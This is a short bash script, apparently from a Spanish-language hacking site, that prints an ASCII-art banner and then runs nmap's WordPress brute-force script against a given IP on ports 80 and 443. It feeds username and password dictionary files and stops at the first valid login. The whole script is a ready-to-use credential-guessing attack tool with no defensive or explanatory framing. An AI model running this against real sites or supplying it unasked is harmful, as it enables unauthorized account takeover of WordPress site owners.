#!/bin/bash
cat << "INFO"
                                                          ..
                               ,,,                         MM .M
                           ,!MMMMMMM!,                     MM MM  ,.
   ., .M                .MMMMMMMMMMMMMMMM.,          'MM.  MM MM .M'
 . M: M;  M          .MMMMMMMMMMMMMMMMMMMMMM,          'MM,:M M'!M'
;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
 M;MM;M :MM      .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.       .MMMMMMMM
 'M;M'M MM      MMMMMM  MMMMMMMMMMMMMMMMM  MMMMMM.    ,,M.M.'MMM'
  MM'MMMM      MMMMMM @@ MMMMMMMMMMMMMMM @@ MMMMMMM.'M''MMMM;MM'
 MM., ,MM     MMMMMMMM  MMMMMMMMMMMMMMMMM  MMMMMMMMM      '.MMM
 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
  ''.'MMM'  .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       MMMM
   MMC      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMMM
  .MM      :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM''MMM       MMMMM
  MMM      :M  'MMMMMMM brute WordPress MMMMM'.MM  MM:M.    'MMMMM
 .MMM   ...:M: :M.'MMMMMMMMMMMMMMMMMMMMMMMMM'.M''   MM:MMMMMMMMMMMM'
AMMM..MMMMM:M.    :M.'hackingyseguridad.com'.MM'     MM''''''''''''
MMMMMMMMMMM:MM     'M'.M'MMMMMMMMMMMMMM'.MC'M'     .MM
 '''''''''':MM.       'MM!M.'M-M-M-M'M.'MM'        MMM
            MMM.            'MMMM!MMMM'            .MM
             MMM.             '''   ''            .MM'
              MMM.                               MMM'
               MMMM            ,.J.JJJJ.       .MMM'
                MMMM.       'JJJJJJJ'JJJM   CMMMMM
                  MMMMM.    'JJJJJJJJ'JJJ .MMMMM'
                    MMMMMMMM.'  'JJJJJ'JJMMMMM'
                      'MMMMMMMMM'JJJJJ JJJJJ'
                         ''MMMMMMJJJJJJJJJJ'
                                 'JJJJJJJJ'
INFO
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a Login WordPress en puerto por defecto 80,443/TCP."
        echo "Requiere nmap"
        echo "Uso.: sh brutewordpress.sh <ip>"
        echo
        exit 0
fi
echo
echo
nmap -Pn $1 -p 80,443 --script=http-wordpress-brute  --script-args 'userdb=ususarios.txt,passdb=claves.txt,http-wordpress-brute.hostname=domain.com,
http-wordpress-brute.threads=3,brute.firstonly=true' 
